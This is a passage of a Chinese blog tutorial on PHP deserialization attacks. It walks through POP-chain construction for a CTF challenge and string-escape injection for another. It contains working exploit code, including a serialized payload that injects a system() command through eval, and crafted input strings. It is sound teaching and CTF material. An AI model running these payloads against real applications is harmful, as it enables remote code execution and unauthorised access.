<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1:20001&#x2F;unserialize1.php&#x2F;?code&#x3D;O:1:%22A%22:2:&#123;s:6:%22target%22;O:1:%22B%22:0:&#123;&#125;&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2022/04/29/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20220516011212369.png" alt="image-20220516011212369"></p>
<h1 id="pop链"><a href="#pop链" class="headerlink" title="pop链"></a>pop链</h1><h3 id="起点"><a href="#起点" class="headerlink" title="起点"></a>起点</h3><p><code>__destruct()</code> /<code>__wakeup()</code>是起点 （自动调用的方法）</p>
<h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>通过起点分析，例如该起点<code>__destruct()</code>方法里面的操作会触发哪些魔术方法，</p>
<p>如果有，则进入下一个类继续那样分析，</p>
<p>如果没有就可以看<code>__destruct()</code>调用哪些其他类的方法，继续到下个类的方法进行分析，</p>
<p>如果<code>__destruct()</code>调用没有哪些其他类的方法，一般不会，因为起点将毫无意义啊，那就只能指向其他类去调有用的方法了吧</p>
<p>分析时候可以<code>正推利用链</code>或者<code>倒推利用链</code></p>
<h3 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h3><ul>
<li>das三月su例题ezpop[atao]</li>
</ul>
<p>源码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">crow</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $v1;</span><br><span class="line">    <span class="keyword">public</span> $v2;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">eval</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">new</span> <span class="keyword">$this</span>-&gt;v1(<span class="keyword">$this</span>-&gt;v2);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;v1-&gt;world();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">fin</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $f1;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;f1 . <span class="string">&#x27;114514&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">run</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        (<span class="keyword">$this</span>-&gt;f1)();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params">$a, $b</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;f1-&gt;get_flag();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">what</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $a;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;a-&gt;run();</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;hello&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">mix</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $m1;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">run</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        (<span class="keyword">$this</span>-&gt;m1)();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get_flag</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="string">&#x27;#&#x27;</span> . <span class="keyword">$this</span>-&gt;m1);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">&#x27;cmd&#x27;</span>])) &#123;</span><br><span class="line">    unserialize($_POST[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>从起点<code>__destruct()</code>开始分析 ：</p>
<ol>
<li><p>先new fin()，fin()里面有 echo输出，会调用__toString()，看到what里面有这个方法，直接this-&gt;f1= new what()</p>
</li>
<li><p>what()里面调了个run方法，fin和mix都有这个方法，这里用mix类方法，$this-&gt;a =new mix()</p>
</li>
<li><p>下面就要用到__invoke这个魔术方法将类当做函数使用 ,$this-&gt;m1=new crow()</p>
</li>
<li><p>进入crow类中的__invoke方法，这个方法里最后会去指向一个world函数，但是搜遍全文未发现该函数。默认会调用<code>__call</code>这个魔术方法，$this-&gt;v1=new fin()。</p>
</li>
<li><p>然后在<code>__call</code>方法中发现$this-&gt;f1-&gt;get_flag()，$this-&gt;f1去调用get_flag()这个方法，所以$this-&gt;f1=new mix()。</p>
</li>
<li><p>mix()中通过对m1赋值即可命令执行，前面的注释符使用<code>\n</code>绕过。</p>
</li>
</ol>
<p>利用链过程如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Created</span> by PhpStorm_培训</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Author</span>: shmily-ing</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Data</span>: 2022/5/15 21:11</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">fin</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $f1;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;f1 . <span class="string">&#x27;114514&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">what</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $a;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;a-&gt;run();</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;hello&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">mix</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $m1;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">run</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        (<span class="keyword">$this</span>-&gt;m1)();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">crow</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $v1;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;v1-&gt;world();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">fin</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $f1;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params">$a, $b</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;f1-&gt;get_flag();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">mix</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $m1;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get_flag</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="string">&#x27;#&#x27;</span> . <span class="keyword">$this</span>-&gt;m1);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>exp构造：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Created</span> by PhpStorm_培训</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Author</span>: shmily-ing</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Data</span>: 2022/5/15 21:24</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">crow</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $v1;</span><br><span class="line">    <span class="keyword">public</span> $v2;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">eval</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">new</span> <span class="keyword">$this</span>-&gt;v1(<span class="keyword">$this</span>-&gt;v2);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;v1-&gt;world();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">fin</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $f1;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;f1 . <span class="string">&#x27;114514&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">run</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        (<span class="keyword">$this</span>-&gt;f1)();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params">$a, $b</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;f1-&gt;get_flag();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">what</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $a;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;a-&gt;run();</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;hello&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">mix</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $m1;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">run</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        (<span class="keyword">$this</span>-&gt;m1)();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get_flag</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="string">&#x27;#&#x27;</span> . <span class="keyword">$this</span>-&gt;m1);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">$a = <span class="keyword">new</span> fin();</span><br><span class="line"></span><br><span class="line">$a-&gt;f1=<span class="keyword">new</span> what();</span><br><span class="line"></span><br><span class="line">$a-&gt;f1-&gt;a=<span class="keyword">new</span> mix();</span><br><span class="line"></span><br><span class="line">$a-&gt;f1-&gt;a-&gt;m1 =<span class="keyword">new</span> crow();</span><br><span class="line"></span><br><span class="line">$a-&gt;f1-&gt;a-&gt;m1-&gt;v1=<span class="keyword">new</span> fin();</span><br><span class="line"></span><br><span class="line">$a-&gt;f1-&gt;a-&gt;m1-&gt;v1-&gt;f1=<span class="keyword">new</span> mix();</span><br><span class="line"></span><br><span class="line">$a-&gt;f1-&gt;a-&gt;m1-&gt;v1-&gt;f1-&gt;m1=<span class="string">&quot;\nsystem(&#x27;find | xargs grep flag&#x27;);&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize($a));</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>输出：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">O%3A3%3A%22fin%22%3A1%3A%7Bs%3A2%3A%22f1%22%3BO%3A4%3A%22what%22%3A1%3A%7Bs%3A1%3A%22a%22%3BO%3A3%3A%22mix%22%3A1%3A%7Bs%3A2%3A%22m1%22%3BO%3A4%3A%22crow%22%3A2%3A%7Bs%3A2%3A%22v1%22%3BO%3A3%3A%22fin%22%3A1%3A%7Bs%3A2%3A%22f1%22%3BO%3A3%3A%22mix%22%3A1%3A%7Bs%3A2%3A%22m1%22%3Bs%3A34%3A%22%0Asystem%28%27find+%7C+xargs+grep+flag%27%29%3B%22%3B%7D%7Ds%3A2%3A%22v2%22%3BN%3B%7D%7D%7D%7Dhello114514</span><br></pre></td></tr></table></figure>

<p>拿到flag</p>
<p><img src="/2022/04/29/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20220515233430846.png" alt="image-20220515233430846"></p>
<h1 id="字符串逃逸"><a href="#字符串逃逸" class="headerlink" title="字符串逃逸"></a>字符串逃逸</h1><ul>
<li>可以分两种：字符增加和字符减少</li>
</ul>
<h3 id="字符增加"><a href="#字符增加" class="headerlink" title="字符增加"></a>字符增加</h3><p>核心即构造闭合。</p>
<p>直接上例题 unctf2020 easyunserialize：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">a</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $uname;</span><br><span class="line">    <span class="keyword">public</span> $password;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$uname,$password</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;uname=$uname;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password=$password;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;password===<span class="string">&#x27;easy&#x27;</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line">                <span class="keyword">echo</span> $flag;    </span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&#x27;wrong password&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params">$string</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> str_replace(<span class="string">&#x27;challenge&#x27;</span>,<span class="string">&#x27;easychallenge&#x27;</span>,$string);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$uname=$_GET[<span class="number">1</span>];</span><br><span class="line">$password=<span class="number">1</span>;</span><br><span class="line">$ser=filter(serialize(<span class="keyword">new</span> a($uname,$password)));</span><br><span class="line">$test=unserialize($ser);</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>



<blockquote>
<p>先反序列化：</p>
</blockquote>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Created</span> by PhpStorm_培训</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Author</span>: shmily-ing</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Data</span>: 2022/5/8 15:51</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">a</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $uname;</span><br><span class="line">    <span class="keyword">public</span> $password;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$uname,$password</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;uname=$uname;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password=$password;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//    public function __wakeup()</span></span><br><span class="line"><span class="comment">//    &#123;</span></span><br><span class="line"><span class="comment">//        if($this-&gt;password===&#x27;easy&#x27;)</span></span><br><span class="line"><span class="comment">//        &#123;</span></span><br><span class="line"><span class="comment">//            include(&#x27;flag.php&#x27;);</span></span><br><span class="line"><span class="comment">//            echo $flag;</span></span><br><span class="line"><span class="comment">//        &#125;</span></span><br><span class="line"><span class="comment">//        else</span></span><br><span class="line"><span class="comment">//        &#123;</span></span><br><span class="line"><span class="comment">//            echo &#x27;wrong password&#x27;;</span></span><br><span class="line"><span class="comment">//        &#125;</span></span><br><span class="line"><span class="comment">//    &#125;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params">$string</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> str_replace(<span class="string">&#x27;challenge&#x27;</span>,<span class="string">&#x27;easychallenge&#x27;</span>,$string);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//&quot;;s:8:&quot;password&quot;;s:4:&quot;easy&quot;;&#125;</span></span><br><span class="line"><span class="comment">//$uname = &#x27;challengechallengechallengechallengechallengechallengechallengechallenge&quot;;s:8:&quot;password&quot;;s:4:&quot;easy&quot;;&#125;aaa&#x27;;</span></span><br><span class="line">$uname = <span class="string">&#x27;challenge&#x27;</span>;</span><br><span class="line">$password = <span class="number">1</span>;</span><br><span class="line">$s = <span class="keyword">new</span> a($uname,$password);</span><br><span class="line">var_dump($s);</span><br><span class="line"><span class="comment">//</span></span><br><span class="line">var_dump(serialize($s));</span><br><span class="line"></span><br><span class="line">var_dump(filter(serialize($s)));</span><br><span class="line"></span><br><span class="line">var_dump(unserialize(filter(serialize($s))));</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><code>$uname = &#39;challenge&#39;;</code>结果为:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">D:\phpstudy_pro\Extensions\php\php7<span class="number">.1</span><span class="number">.9</span>nts\php.exe C:\Users\<span class="number">25390</span>\PhpstormProjects\培训\exp4.php</span><br><span class="line"><span class="keyword">object</span>(a)<span class="comment">#1 (2) &#123;</span></span><br><span class="line">  [<span class="string">&quot;uname&quot;</span>]=&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">9</span>) <span class="string">&quot;challenge&quot;</span></span><br><span class="line">  [<span class="string">&quot;password&quot;</span>]=&gt;</span><br><span class="line">  <span class="keyword">int</span>(<span class="number">1</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">string</span>(<span class="number">59</span>) <span class="string">&quot;O:1:&quot;</span>a<span class="string">&quot;:2:&#123;s:5:&quot;</span>uname<span class="string">&quot;;s:9:&quot;</span>challenge<span class="string">&quot;;s:8:&quot;</span>password<span class="string">&quot;;i:1;&#125;&quot;</span> </span><br><span class="line"><span class="keyword">string</span>(<span class="number">63</span>) <span class="string">&quot;O:1:&quot;</span>a<span class="string">&quot;:2:&#123;s:5:&quot;</span>uname<span class="string">&quot;;s:9:&quot;</span>easychallenge<span class="string">&quot;;s:8:&quot;</span>password<span class="string">&quot;;i:1;&#125;&quot;</span></span><br><span class="line"><span class="keyword">bool</span>(<span class="literal">false</span>)</span><br><span class="line"></span><br><span class="line">Process finished with <span class="keyword">exit</span> code <span class="number">0</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>bool(false)说明序列化字符串有问题，不能被反序列化</p>
<p>var_dump(filter(serialize($s)));  ——》O:1:”a”:2:{s:5:”uname”;s:9:”easychallenge”;s:8:”password”;i:1;} </p>
<p>问题就在 challenge -&gt; easychallenge 字符增加4，但uname的长度仍为9个字符，</p>
<p>所以需要为了保证经过filter()函数处理后的序列化内容能够合规，每传入一个challenge，我们就需要在challenge后面加4个字符。</p>
<p>我们目的需要让password的值为easy，题目中给的为固定值，我们只有构造闭合<code>password=&quot;easy&quot;,&quot;;s:8:&quot;password&quot;;s:4:&quot;easy&quot;;&#125;</code>共有29个字符</p>
<p>逃逸构造:</p>
<p>8个challenge，构造32个字符， 29+3即可</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$uname = <span class="string">&#x27;challengechallengechallengechallengechallengechallengechallengechallenge&quot;;s:8:&quot;password&quot;;s:4:&quot;easy&quot;;&#125;aaa&#x27;</span>;</span><br></pre></td></tr></table></figure>

<p>运行结果</p>
<p><img src="/2022/04/29/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20220515144058398.png" alt="image-20220515144058398"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">object(a)#1 (2) &#123;</span><br><span class="line">  [&quot;uname&quot;]&#x3D;&gt;</span><br><span class="line">  string(104) &quot;challengechallengechallengechallengechallengechallengechallengechallenge&quot;;s:8:&quot;password&quot;;s:4:&quot;easy&quot;;&#125;aaa&quot;</span><br><span class="line">  [&quot;password&quot;]&#x3D;&gt;</span><br><span class="line">  int(1)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">string(156) &quot;O:1:&quot;a&quot;:2:&#123;s:5:&quot;uname&quot;;s:104:&quot;challengechallengechallengechallengechallengechallengechallengechallenge&quot;;s:8:&quot;password&quot;;s:4:&quot;easy&quot;;&#125;aaa&quot;;s:8:&quot;password&quot;;i:1;&#125;&quot;</span><br><span class="line"></span><br><span class="line">string(188) &quot;O:1:&quot;a&quot;:2:&#123;s:5:&quot;uname&quot;;s:104:&quot;easychallengeeasychallengeeasychallengeeasychallengeeasychallengeeasychallengeeasychallengeeasychallenge&quot;;s:8:&quot;password&quot;;s:4:&quot;easy&quot;;&#125;aaa&quot;;s:8:&quot;password&quot;;i:1;&#125;&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">object(a)#2 (2) &#123;</span><br><span class="line">  [&quot;uname&quot;]&#x3D;&gt;</span><br><span class="line">  string(104) &quot;easychallengeeasychallengeeasychallengeeasychallengeeasychallengeeasychallengeeasychallengeeasychallenge&quot;</span><br><span class="line">  [&quot;password&quot;]&#x3D;&gt;</span><br><span class="line">  string(4) &quot;easy&quot;            #可以看到password的值已经传入成功</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p><code>O:1:&quot;a&quot;:2:&#123;s:5:&quot;uname&quot;;s:104:&quot;easychallengeeasychallengeeasychallengeeasychallengeeasychallengeeasychallengeeasychallengeeasychallenge&quot;;s:8:&quot;password&quot;;s:4:&quot;easy&quot;;&#125;</code>aaa”;s:8:”password”;i:1;}``</p>
<p>由于只有两个对象，并且闭合成功，灰色部分就不能执行被丢弃了。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?1&#x3D;</span><br><span class="line">challengechallengechallengechallengechallengechallengechallengechallenge&quot;;s:8:&quot;password&quot;;s:4:&quot;easy&quot;;&#125;aaa</span><br></pre></td></tr></table></figure>

<p><img src="/2022/04/29/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20220515133610433.png" alt="image-20220515133610433"></p>
<h3 id="字符减少"><a href="#字符减少" class="headerlink" title="字符减少"></a>字符减少</h3><p>对上题的简单修改</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">a</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $u;</span><br><span class="line">    <span class="keyword">public</span> $uname;</span><br><span class="line">    <span class="keyword">public</span> $password;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$u,$uname,$password</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;u = $u;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;uname=$uname;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password=$password;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;password===<span class="string">&#x27;easy&#x27;</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line">                <span class="keyword">echo</span> $flag;    </span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&#x27;wrong password&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params">$string</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> str_replace(<span class="string">&#x27;challenge&#x27;</span>,<span class="string">&#x27;&#x27;</span>,$string);</span><br><span class="line">&#125;</span><br><span class="line">$u=$_GET[<span class="string">&#x27;u&#x27;</span>];</span><br><span class="line">$uname=$_GET[<span class="string">&#x27;uname&#x27;</span>];</span><br><span class="line">$password=<span class="string">&#x27;1&#x27;</span>;</span><br><span class="line">$ser=filter(serialize(<span class="keyword">new</span> a($u,$uname,$password)));</span><br><span class="line">$test=unserialize($ser);</span><br><span class="line">var_dump($test);</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>

<p>目的还是password===easy</p>
